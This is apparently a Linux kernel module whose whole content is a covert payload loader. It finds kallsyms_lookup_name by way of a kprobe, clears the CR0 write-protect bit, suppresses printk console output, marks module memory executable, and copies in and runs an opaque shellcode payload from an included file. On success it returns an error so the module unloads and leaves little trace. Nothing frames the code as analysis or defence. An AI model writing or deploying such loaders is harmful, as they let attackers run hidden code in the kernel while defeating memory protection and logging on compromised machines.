#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/kprobes.h>
#include <net/net_namespace.h>
#include <linux/preempt.h>
#include "payload.inc"
#include <linux/console.h>
#include <linux/tty.h>
#include <linux/printk.h>
#include <linux/syscalls.h>
#include <linux/slab.h>
#define KERN_SOH	"\001"		/* ASCII Start Of Header */
#define KERN_TROLLED	KERN_SOH "7"	/* nothin */
static struct kprobe kp = {
	.symbol_name = "kallsyms_lookup_name"
};



static long lookupName = 0;
module_param(lookupName, long, 0);

// extern __attribute__((weak)) unsigned long kallsyms_lookup_name(const char *);

unsigned long lookup_name(const char *name) {
	typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
	kallsyms_lookup_name_t kallsyms_lookup_name;
	register_kprobe(&kp);
	kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
	unregister_kprobe(&kp);
	//static typeof(lookup_name) *lookup = (void *)kallsyms_lookup_name;
	//if (NULL == lookup)
	//	lookup = (void *)lookupName;
	//return lookup ? lookup(name) : 0;
	return kallsyms_lookup_name(name);
}
unsigned long cr0;

// void pogged_native_write_cr0(unsigned long val)
// {
// 	asm volatile("mov %0,%%cr0": "+r" (val) : : "memory");
// }

// static inline void zero_wp(void) {
//   	  pogged_native_write_cr0(read_cr0() & ~0x10000);
// }
// static inline void one_wp(void) {
//       pogged_native_write_cr0(read_cr0() | 0x10000);
// }

extern void * __force_order;

void zero_wp(void) {
    unsigned long cr0;

    /* Disable interrupts */
    asm volatile ("cli\n\t"
                  "mov %%cr0, %0"
                  : "=r" (cr0), "+m" (__force_order)
                  : 
                  : "memory");
    /* Clear WP bit */
    cr0 &= ~0x10000UL;
    /* Write back to CR0 */
    asm volatile ("mov %0, %%cr0"
                  : 
                  : "r" (cr0), "m" (__force_order));
}

void one_wp(void) {
    unsigned long cr0;

    /* Read CR0 */
    asm volatile ("mov %%cr0, %0"
                  : "=r" (cr0), "+m" (__force_order)
                  :
                  : "memory");
    /* Set WP bit */
    cr0 |= 0x10000UL;
    /* Write back to CR0 and enable interrupts */
    asm volatile ("mov %0, %%cr0\n\t"
                  "sti"
                  : 
                  : "r" (cr0), "m" (__force_order));
}

// static void stop_all_consoles(void) {
//     struct console *con;

//     for_each_console(con) {
// 		console_stop(con);
//     }
// }

// static void start_all_consoles(void) {
//     struct console *con;

//     for_each_console(con) {
// 		console_start(con);
//     }
// }

// asmlinkage int fake_printk(const char *fmt, ...)
// {
// 	return 0;
// }

// static asmlinkage int (*real_printk)(const char *fmt, ...);

// extern int suppress_printk;

int init_module(void) {

	// real_printk = (void *)lookup_name("printk");
	// if (!real_printk) {
	// 	pr_info("printk() not found\n");
	// 	return -ENOSYS;
	// }

	// real_vprintk_emit = (void *)lookup_name("vprintk_emit");
	// if (!real_vprintk_emit) {
	// 	pr_info("vprintk_emit() not found\n");
	// 	return -ENOSYS;
	// }

	// real_printk = (void *)lookup_name("_printk");
	// if (!real_printk) {
	// 	pr_info("printk() not found\n");
	// 	return -ENOSYS;
	// }


	// stop_all_consoles();
	// console_lock();
	void *mem = NULL;
	void *(*malloc)(long size) = NULL;
	int   (*set_memory_x)(unsigned long, int) = NULL;
	int *suppress_printk_ptr = NULL;
	suppress_printk_ptr = (int *)lookup_name("suppress_printk");
	if (!suppress_printk_ptr) {
		pr_info("suppress_printk not found\n");
		goto Error;
	}



	malloc = (void *)lookup_name("module_alloc");
	if (!malloc) {
		pr_info("module_alloc() not found\n");
		goto Error;
	}

	mem = malloc(round_up(payload_len, PAGE_SIZE));
	if (!mem) {
		pr_info("malloc(payload_len) failed\n");
		goto Error;
	}



	pr_info("before open_kernel\n");

	cr0=read_cr0();
  	pr_info("The value of cr0 before modification :%lx\n",cr0);
	
	zero_wp();

  	cr0=read_cr0();
  	pr_info("The value of cr0 after open :%lx\n",cr0);

//	*(unsigned long *)&printk = (unsigned long)fake_printk;
	// *(unsigned long *)&vprintk_emit = (unsigned long)fake_vprintk_emit;
	// *(volatile long *)real_printk = (volatile long)fake_printk;
	// suppress_printk = 1;
	smp_mb();
	*suppress_printk_ptr = 1;
	smp_mb();
	pr_info("console suppressed\n");

	set_memory_x = (void *)lookup_name("set_memory_x");
	if (set_memory_x) {
		int numpages = round_up(payload_len, PAGE_SIZE) / PAGE_SIZE;
		set_memory_x((unsigned long)mem, numpages);
	}
	pr_info("memory set executable!\n");


	pr_info("dumping payload!\n");

	print_hex_dump_bytes("payload@", DUMP_PREFIX_OFFSET, payload, payload_len);

	memcpy(mem, payload, payload_len);
	pr_info("memcopy attempted!\n");
	one_wp();
  	cr0=read_cr0();
  	pr_info("The value of cr0 after close :%lx\n",cr0);

	// restore printk
//	*(unsigned long *)&real_printk = (unsigned long)printk;
	// *(unsigned long *)&real_vprintk_emit = (unsigned long)vprintk_emit;

	// *(volatile long *)real_printk = (volatile long)real_printk;
	// suppress_printk = 0;
	smp_mb();
	*suppress_printk_ptr = 0;
	smp_mb();
	pr_info("console back to normal\n");

	int retval = ((long (*)(void *, void *))mem)(lookup_name, &init_net);
	if (retval == 0) {
		pr_info("payload executed succesfully!\n");
		return -ENOTTY; // success
	} else {
		pr_info("payload failed to execute!\n");
		pr_info("retval: %d\n", retval);
	}

	

Error:
	if (mem) {
		vfree(mem);
		pr_info("vfree(mem) attempted!\n");
	} else {
		pr_info("mem was NULL!\n");
	}
	return -ESRCH; // failure
}

MODULE_LICENSE("GPL");
